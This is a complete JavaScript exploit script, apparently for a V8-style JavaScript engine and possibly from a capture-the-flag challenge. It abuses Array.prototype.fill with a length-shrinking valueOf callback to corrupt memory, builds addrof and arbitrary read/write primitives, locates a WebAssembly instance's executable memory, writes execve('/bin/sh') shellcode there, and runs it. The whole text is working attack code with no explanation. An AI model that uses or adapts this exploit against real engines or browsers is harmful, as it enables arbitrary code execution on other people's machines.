var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}

function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function hex(i)
{
    return i.toString(16).padStart(16, "0");
}
function test() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;
}

get_pwnd = test();
array = [];
globle_arr=[];
array.length = 100000000;
bb={valueOf:function() {
  array.length = 32;
  array.fill(1);
	let arr=[1.1,1.2,1.3,1.4];
	globle_arr=arr;
  return 0x30;
}};
b = array.fill(0x10000, 0x2F, bb);
let leak_obj=[array,array,array,array];
let rw_obj=new ArrayBuffer(0x1000);
let dv=new DataView(rw_obj);
function addrof(t){
leak_obj[0]=t;
return f2i(globle_arr[10]);
}
function read(addr){
globle_arr[22]=i2f(BigInt(addr));
return f2i(dv.getFloat64(0, true));
}
function write(addr,value){
globle_arr[22]=i2f(BigInt(addr));
dv.setFloat64(0, i2f(BigInt(value)),true);
}


test_addr=addrof(get_pwnd);

test_addr=read(test_addr+23n);

test_addr=read(test_addr+7n);

test_addr=read(test_addr+15n);

test_addr=read(test_addr+127n);
console.log(hex(test_addr));


globle_arr[22]=i2f(BigInt(test_addr));
let shellcode=[106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5]
for (let i = 0; i < shellcode.length; i++) {
    dv.setUint8(i, shellcode[i]);
}
get_pwnd();

